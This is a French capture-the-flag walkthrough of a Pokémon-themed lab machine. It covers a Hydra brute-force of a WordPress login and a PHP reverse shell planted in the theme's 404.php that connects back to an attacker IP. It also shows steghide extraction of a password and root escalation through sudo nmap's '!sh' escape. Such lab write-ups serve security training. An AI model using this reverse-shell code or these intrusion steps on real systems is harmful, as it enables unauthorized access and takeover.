# Gotta Catch Them All - CTF Walkthrough

## Sommaire

1. [Reconnaissance initiale (robots.txt, message.txt)](#1-reconnaissance-initiale-robotstxt-messagetxt)
2. [Bruteforce WordPress avec Hydra](#2-bruteforce-wordpress-avec-hydra)
3. [Reverse Shell via 404.php](#3-reverse-shell-via-404php)
4. [Analyse Stegano (grass.jpeg)](#4-analyse-stegano-grassjpeg)
5. [Accès SSH & Escalade de Privilèges](#5-accès-ssh--escalade-de-privilèges)

---

## 1. Reconnaissance Initiale (robots.txt, message.txt)

On commence par analyser les fichiers `robots.txt` et `message.txt`. Ces fichiers contiennent des indices. Le fichier `message.txt` indique que le mot de passe d'Ash fait partie d'une wordlist personnalisée.

On écrit un script Python pour générer une wordlist basée sur des noms de Pokémon (ou on en récupère une existante).

## 2. Bruteforce WordPress avec Hydra

On utilise Hydra pour forcer la connexion WordPress avec l’utilisateur Ash :

```bash
hydra -l Ash -P listpokemon 10.10.145.11"
```

Accès obtenu ✅

## 3. Reverse Shell via 404.php

On se connecte à WordPress en tant qu’administrateur Ash. Dans l’éditeur de thème, on modifie `404.php` et on y place un reverse shell PHP :

```php
<?php
$ip = '10.8.92.59';
$port = 9001;
$sock = fsockopen($ip, $port);
$proc = proc_open("/bin/sh", [0 => $sock, 1 => $sock, 2 => $sock], $pipes);
?>
```

On écoute côté attaquant :

```bash
nc -lvnp 9001
```

On déclenche une 404 depuis le site → Shell obtenu 🎉

🎉 **1er Flag obtenu**

## 4. Analyse Stegano (grass.jpeg)

On récupère une image `grass.jpeg`. Elle contient un message caché.

```bash
steghide extract -sf grass.jpeg
# Password: mew
```

Contenu du fichier extrait `message.txt` :

```
Alright Ash you won, here is your password to log in:
I_Wanna_Be_The_Very_Best_With_Pikachu
```

## 5. Accès SSH & Escalade de Privilèges

Connexion SSH avec :

```bash
ssh ash@10.10.145.11
# Password: I_Wanna_Be_The_Very_Best_With_Pikachu
```

🎉 **2ème Flag obtenu**

On vérifie les droits sudo :

```bash
sudo -l
```

Résultat : on peut exécuter `discover_new_pokemon`, un script basé sur **nmap**.

On l’exécute :

```bash
sudo /usr/local/bin/discover_new_pokemon
```

Une fois dans l’interface interactive de Nmap, on utilise :

```bash
!sh
```

➡️ Et on devient root !

---

✅ **Root obtenu sur Gotta Catch Them All !**

🎉 **3ème Flag obtenu**
